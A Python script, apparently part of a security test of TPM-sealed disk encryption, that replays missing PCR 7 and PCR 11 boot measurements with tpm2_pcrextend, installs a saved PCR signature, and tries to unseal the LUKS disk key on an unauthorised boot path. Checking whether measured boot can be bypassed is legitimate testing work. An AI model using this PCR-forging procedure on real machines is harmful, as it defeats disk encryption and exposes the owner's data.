# Attack test, part B (run as root after booting the staged Debian kernel): replay the PCR 7 and
# PCR 11 events the attack path is missing, then ask the TPM for the disk key.
import json, subprocess, sys
D = '/root/n5'
P = '/usr/lib/systemd/systemd-pcrlock'

def events(log, pcr):
    return [(e.get('description') or e.get('event'), e['sha256']) for e in log['log'] if e['pcr'] == pcr]

legit = json.load(open(f'{D}/legit-log.json'))
now = json.loads(subprocess.run([P, 'log', '--json=short'], capture_output=True, text=True).stdout)
l7, n7 = events(legit, 7), events(now, 7)
print('legit PCR 7 events:', len(l7), ' attack-path PCR 7 events:', len(n7))
for i, (a, b) in enumerate(zip(l7, n7)):
    if a[1] != b[1]:
        print(f'PCR 7 differs at event {i}: legit {a[0]!r} vs attack {b[0]!r}')
        print('RESULT: closed (attack path PCR 7 is not a prefix of the legit one)')
        sys.exit(0)
if len(n7) > len(l7):
    print('RESULT: closed (attack path has extra PCR 7 events)'); sys.exit(0)
missing7 = l7[len(n7):]
print('missing PCR 7 events:', [m[0] for m in missing7])

# firmware-log events only: pcrlock log also lists the userspace phase measurements
l11 = [(e.get('description'), e['sha256']) for e in legit['log'] if e['pcr'] == 11 and e.get('phase') == 'F']
n11 = events(now, 11)
print('legit PCR 11 firmware-log events:', len(l11), ' attack-path:', len(n11))
# userspace measurement of "enter-initrd" (JSON-SEQ records separated by RS)
phase = None
for rec in open(f'{D}/legit-userspace.log').read().split('\x1e'):
    rec = rec.strip()
    if not rec:
        continue
    r = json.loads(rec)
    if r.get('pcr') == 11 and 'enter-initrd' in json.dumps(r.get('content', {})):
        phase = [d['digest'] for d in r['digests'] if d['hashAlg'] == 'sha256'][0]
        break
print('enter-initrd digest found:', bool(phase))

def extend(pcr, digest):
    subprocess.run(['tpm2_pcrextend', f'{pcr}:sha256={digest}'], check=True)

for _, d in missing7:
    extend(7, d)
for _, d in l11:
    extend(11, d)
extend(11, phase)
subprocess.run(['cp', f'{D}/pcrsig.json', '/run/systemd/tpm2-pcr-signature.json'], check=True)
subprocess.run(['cp', '/etc/systemd/tpm2-pcr-public-key.pem', '/run/systemd/tpm2-pcr-public-key.pem'], check=True)
r = subprocess.run(['cryptsetup', 'open', '--test-passphrase', '--token-only', '/dev/nvme0n1p2'])
print('RESULT:', 'HOLE: TPM released the disk key on the attack path' if r.returncode == 0 else 'closed: TPM refused')
